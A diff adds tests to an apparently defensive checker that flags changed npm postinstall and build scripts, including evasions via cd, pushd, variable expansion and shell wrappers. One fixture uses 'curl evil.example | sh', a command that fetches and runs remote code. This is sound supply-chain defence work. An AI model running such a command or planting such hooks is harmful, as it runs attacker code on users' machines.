@@ -203,3 +203,35 @@ describe("a nested package's script file under a test or docs folder", () => {
     expect(held({ postinstall: "lerna run build", build: "echo ok" }, { "tests/helper.js": "1" }, { "tests/helper.js": "2" })).toBe(false);
   });
 });
+
+describe("fourth review round: escapes", () => {
+  // sub/index.js exists, so the word `sub` resolves to a file; only the manifest build changes.
+  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
+  const idxHeld = (hook: string) => held({ postinstall: hook, build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"));
+
+  test("a cd or pushd always widens, even when its target resolves to a file", () => {
+    for (const cmd of ["cd sub && npm run build", "pushd sub && npm run build", "cd sub; yarn build", "command cd sub && npm run build", "builtin cd sub && npm run build"]) {
+      expect(idxHeld(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("an unresolvable expansion in a body that moves the run widens", () => {
+    for (const cmd of ["npm run build --prefix $PWD/sub", "cd $PWD/sub && npm run build", "pnpm -C ${INIT_CWD}/sub build"]) {
+      expect(manifestHeld(cmd), cmd).toBe(true);
+    }
+    expect(manifestHeld("npm run build $FOO")).toBe(false);
+  });
+
+  test("every leading assignment is checked", () => {
+    for (const cmd of ["CI=1 npm_config_workspace=sub npm run build", "A=1 B=2 YARN_RC_FILENAME=x yarn build"]) {
+      expect(manifestHeld(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("unknown npm flags, shell options and a backslash do not hide the move", () => {
+    for (const cmd of ["npm run build --prefi sub > /dev/null", "sh -c 'npm run build --prefi sub'", "bash --norc -c 'cd sub && npm run build'", "sh -e -c 'cd sub && npm run build'", "\\cd sub > /dev/null && npm run build", "corepack npm run build --prefi sub"]) {
+      expect(idxHeld(cmd), cmd).toBe(true);
+    }
+    expect(idxHeld("npm run build > /dev/null")).toBe(false);
+  });
+});
